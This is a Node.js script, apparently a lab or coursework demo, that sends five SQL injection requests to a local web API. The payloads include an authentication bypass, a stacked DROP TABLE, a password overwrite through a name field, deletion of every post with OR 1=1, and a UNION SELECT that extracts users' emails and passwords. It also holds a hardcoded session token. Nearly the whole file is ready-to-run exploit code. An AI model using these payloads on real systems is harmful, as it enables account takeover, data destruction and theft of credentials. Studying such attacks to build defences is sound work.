//SCRIPT to attack with sql injection server sending dirty request
//To run it type -> node sql_injection.js

var axios = require('axios')

//for attack 3 e 4, insert valid token
var token = '2c97cd96b21c4a3c5e951740b8721e47eae5f8bda8f6f07edeec5c847bf9757cf042e3e787cf36060caf56277def48e003a6cf211801b66583098abd52364c33' //insert here valid token

///*** 1 ***////
//With this attack, i can access to an user account (i have to know victim email)
//Or i can access to random user (OR 1=1)
//If attack goes right, server return valid session token
myJSONObject = {'mail': "f@f.it' OR 1 LIMIT 1 -- -", "pwd": "a"}
axios.post('http://127.0.0.1:3001/api/user/auth', myJSONObject)
.then(response => {
    console.log("1: I get this valid session token [" + response.data.token + "]")
    token = response.data.token
})

///*** 2 ***////
//Add second query to manipolate data structure
//In this case, MySql connector doesn't support multiple queries in one transaction
//So return error
var data = {
    "mail": "z@s.it",
    "pwd": "as",
    "name": "Antonio",
    "surname": "Varoni",
    "country": "Italy'); DROP TABLE user; -- "
}
axios.post( 'http://127.0.0.1:3001/api/user/register', data)
.then( response => {
    if(response.status==200)
        console.log("2: Executed")
    })
.catch( error => {
    console.log("2: " + error.message)
})

///*** 3 ***////
//If we steal the token of another account (like over), with this attack we change the user's password to 123
//The new password is saved in db equal to '123' and so, it's not a diggest
//For the victim it will be impossible login into his account because the diggest will never
// be composed by only three characters
axios({
    method: 'put',
    url:  'http://127.0.0.1:3001/api/user/name',
    data: {
            "name": "fd', password = '123",
    },
    headers: { Authorization: `Bearer ${token}` }
    })
    .then((response) => {
        if(response.status==200)
            console.log('3: OK')

    })
    .catch((error) => {
        if(error) console.log("3: " + error.message)
    })

///*** 4 ***////
//With this request, a user can delete all posts of all users
axios({
    method: 'delete',
    url: 'http://127.0.0.1:3001/api/post',
    headers: { Authorization: `Bearer ${token}` },
    data: { post_id : "a' OR 1=1; -- -"}
})
.then((response) => {
    if(response.status==200)
        console.log('4: All posts have been deleted')
})
.catch((error) => {
    console.log("4: " + error.message)
})

///*** 5 */
//Using Union to steal value from db
//post id is not valid but we wuold only get stolen values
let post_id = "value' UNION SELECT mail, password, name, surname FROM user; -- -"

axios({
    method: 'get',
    url:  'http://127.0.0.1:3001/api/comment/' + post_id,
    headers: { Authorization: `Bearer ${token}` }
})
.then((response) => {
    if(response.status==200){
        console.log("5: ")
        console.log(response.data)
    }
})
.catch((error)=>{
    console.log("5:" + error.message)
})

